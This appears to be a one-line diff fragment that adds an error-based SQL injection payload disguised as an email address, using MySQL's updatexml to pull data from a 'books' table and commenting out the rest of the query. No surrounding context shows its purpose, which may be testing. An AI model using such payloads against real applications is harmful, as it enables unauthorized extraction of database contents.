@@ -1,0 +1,1 @@
+"',updatexml(null,(select texts from books limit 1),null)); -- @aa.cc
